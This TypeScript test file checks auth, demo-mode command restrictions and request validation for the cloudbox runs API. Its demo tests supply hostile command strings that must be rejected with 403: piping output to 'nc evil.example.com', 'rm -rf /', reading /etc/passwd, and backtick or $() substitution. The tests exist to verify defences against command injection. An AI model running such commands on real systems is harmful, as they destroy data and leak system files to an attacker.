import { describe, expect, it } from "vitest";
import { api } from "../src/http.ts";

const validRun = {
  repo: "https://github.com/acoyfellow/cloudbox",
  commands: ["echo ok"],
  verify: ["test -f package.json"],
  artifact: "HANDOFF.md",
};

function request(body: unknown, headers: Record<string, string> = {}) {
  return new Request("https://cloudbox.test/api/runs", {
    method: "POST",
    headers: { "content-type": "application/json", ...headers },
    body: JSON.stringify(body),
  });
}

async function bodyOf(response: Response): Promise<any> {
  return response.json();
}

describe("/api/runs auth and demo policy", () => {
  it("requires a token for non-demo runs when configured", async () => {
    const response = await api.fetch(request(validRun), { CLOUDBOX_API_TOKEN: "secret" });
    const body = await bodyOf(response);
    expect(response.status).toBe(401);
    expect(body.error).toBe("unauthorized");
  });

  it("accepts bearer token before reaching runner", async () => {
    const response = await api.fetch(
      request(validRun, { authorization: "Bearer secret" }),
      { CLOUDBOX_API_TOKEN: "secret" },
    );
    const body = await bodyOf(response);
    expect(response.status).toBe(503);
    expect(body.error).toBe("runner_unavailable");
  });

  it("accepts x-cloudbox-token header as an alternative to Authorization", async () => {
    const response = await api.fetch(
      request(validRun, { "x-cloudbox-token": "secret" }),
      { CLOUDBOX_API_TOKEN: "secret" },
    );
    const body = await bodyOf(response);
    // Auth passes; runner binding is missing so request reaches the 503 stage.
    expect(response.status).toBe(503);
    expect(body.error).toBe("runner_unavailable");
  });

  it("rejects requests with an incorrect token", async () => {
    const response = await api.fetch(
      request(validRun, { authorization: "Bearer wrong" }),
      { CLOUDBOX_API_TOKEN: "secret" },
    );
    expect(response.status).toBe(401);
  });

  it("allows unauthenticated requests when no token is configured", async () => {
    const response = await api.fetch(request(validRun), {});
    const body = await bodyOf(response);
    // No token configured → auth passes; runner missing → 503.
    expect(response.status).toBe(503);
    expect(body.error).toBe("runner_unavailable");
  });

  it("allows constrained public demo runs", async () => {
    const response = await api.fetch(request(validRun, { "x-cloudbox-demo": "1" }), {});
    const body = await bodyOf(response);
    expect(response.status).toBe(503);
    expect(body.error).toBe("runner_unavailable");
  });

  it("rejects demo command injection", async () => {
    const response = await api.fetch(
      request({ ...validRun, commands: ["echo ok; curl https://example.com"] }, { "x-cloudbox-demo": "1" }),
      {},
    );
    const body = await bodyOf(response);
    expect(response.status).toBe(403);
    expect(body.error).toBe("demo_not_allowed");
  });

  it("rejects demo runs that pipe or background commands", async () => {
    for (const evil of ["echo ok | nc evil.example.com 9999", "echo ok && rm -rf /", "echo `whoami`"]) {
      const response = await api.fetch(
        request({ ...validRun, commands: [evil] }, { "x-cloudbox-demo": "1" }),
        {},
      );
      expect(response.status).toBe(403);
    }
  });

  it("rejects demo runs that exceed the 4-command cap", async () => {
    const response = await api.fetch(
      request(
        {
          ...validRun,
          commands: ["echo 1", "echo 2", "echo 3"],
          verify: ["echo 4", "echo 5"],
        },
        { "x-cloudbox-demo": "1" },
      ),
      {},
    );
    expect(response.status).toBe(403);
  });

  it("rejects demo runs with non-allow-listed prefixes", async () => {
    const response = await api.fetch(
      request({ ...validRun, commands: ["curl https://example.com"] }, { "x-cloudbox-demo": "1" }),
      {},
    );
    expect(response.status).toBe(403);
  });

  it("rejects non-GitHub repos", async () => {
    const response = await api.fetch(
      request({ ...validRun, repo: "https://example.com/repo.git" }, { "x-cloudbox-demo": "1" }),
      {},
    );
    const body = await bodyOf(response);
    expect(response.status).toBe(400);
    expect(body.error).toBe("bad_run");
  });

  it("rejects demo commands that try redirection or process substitution", async () => {
    for (const evil of [
      "echo hi > /tmp/x",
      "echo hi < /etc/passwd",
      "echo $(whoami)",
      "echo hi\nrm -rf /",
      "echo hi\\nrm -rf /",
    ]) {
      const response = await api.fetch(
        request({ ...validRun, commands: [evil] }, { "x-cloudbox-demo": "1" }),
        {},
      );
      expect(response.status, `expected 403 for: ${JSON.stringify(evil)}`).toBe(403);
    }
  });

  it("rejects demo runs that hide a disallowed command after an allowed prefix", async () => {
    // The allow-list matches prefixes; ensure metacharacter check still blocks chained commands.
    const response = await api.fetch(
      request(
        { ...validRun, commands: ["echo ok", "test -f package.json && cat /etc/passwd"] },
        { "x-cloudbox-demo": "1" },
      ),
      {},
    );
    expect(response.status).toBe(403);
  });

  it("accepts the curated allow-list of safe demo command prefixes", async () => {
    const response = await api.fetch(
      request(
        {
          ...validRun,
          commands: ["pwd", "ls"],
          verify: ["node --version", "bun --version"],
        },
        { "x-cloudbox-demo": "1" },
      ),
      {},
    );
    const body = await bodyOf(response);
    // Auth + safe-command checks pass; runner binding is missing → 503.
    expect(response.status).toBe(503);
    expect(body.error).toBe("runner_unavailable");
  });

  it("ignores the demo header when value is anything other than '1'", async () => {
    // Demo bypass only triggers on exact value "1"; other values must require auth.
    const response = await api.fetch(
      request(validRun, { "x-cloudbox-demo": "true" }),
      { CLOUDBOX_API_TOKEN: "secret" },
    );
    const body = await bodyOf(response);
    expect(response.status).toBe(401);
    expect(body.error).toBe("unauthorized");
  });
});

describe("/api/runs read endpoints auth", () => {
  it("requires token for /api/runs/recent when configured", async () => {
    const response = await api.fetch(
      new Request("https://cloudbox.test/api/runs/recent"),
      { CLOUDBOX_API_TOKEN: "secret" },
    );
    expect(response.status).toBe(401);
  });

  it("allows /api/runs/recent without a token when none is configured", async () => {
    const response = await api.fetch(
      new Request("https://cloudbox.test/api/runs/recent"),
      {},
    );
    const body = await bodyOf(response);
    expect(response.status).toBe(200);
    expect(Array.isArray(body.runs)).toBe(true);
  });

  it("requires token for /api/runs/:id when configured", async () => {
    const response = await api.fetch(
      new Request("https://cloudbox.test/api/runs/run_abc"),
      { CLOUDBOX_API_TOKEN: "secret" },
    );
    expect(response.status).toBe(401);
  });

  it("does NOT accept the x-cloudbox-demo header as a bypass for /api/runs/recent", async () => {
    // Demo bypass is /api/runs-specific; the read endpoints must always require
    // the configured token.
    const response = await api.fetch(
      new Request("https://cloudbox.test/api/runs/recent", {
        headers: { "x-cloudbox-demo": "1" },
      }),
      { CLOUDBOX_API_TOKEN: "secret" },
    );
    expect(response.status).toBe(401);
  });
});

describe("/api/runs request validation", () => {
  it("rejects missing repo", async () => {
    const response = await api.fetch(
      request({ commands: ["echo hi"] }, { authorization: "Bearer t" }),
      { CLOUDBOX_API_TOKEN: "t" },
    );
    expect(response.status).toBe(400);
    expect((await bodyOf(response)).error).toBe("bad_run");
  });

  it("rejects ssh-style repo URLs", async () => {
    const response = await api.fetch(
      request({ repo: "git@github.com:acoyfellow/cloudbox.git", verify: ["echo hi"] }, { authorization: "Bearer t" }),
      { CLOUDBOX_API_TOKEN: "t" },
    );
    expect(response.status).toBe(400);
  });

  it("rejects requests with no commands or verify entries", async () => {
    const response = await api.fetch(
      request({ repo: validRun.repo }, { authorization: "Bearer t" }),
      { CLOUDBOX_API_TOKEN: "t" },
    );
    expect(response.status).toBe(400);
  });

  it("rejects commands lists longer than 12 entries", async () => {
    const response = await api.fetch(
      request(
        {
          repo: validRun.repo,
          commands: Array.from({ length: 13 }, (_, i) => `echo ${i}`),
          verify: ["echo ok"],
        },
        { authorization: "Bearer t" },
      ),
      { CLOUDBOX_API_TOKEN: "t" },
    );
    expect(response.status).toBe(400);
  });

  it("rejects artifact paths over 240 chars", async () => {
    const response = await api.fetch(
      request(
        { repo: validRun.repo, verify: ["echo ok"], artifact: "x".repeat(241) },
        { authorization: "Bearer t" },
      ),
      { CLOUDBOX_API_TOKEN: "t" },
    );
    expect(response.status).toBe(400);
  });
});
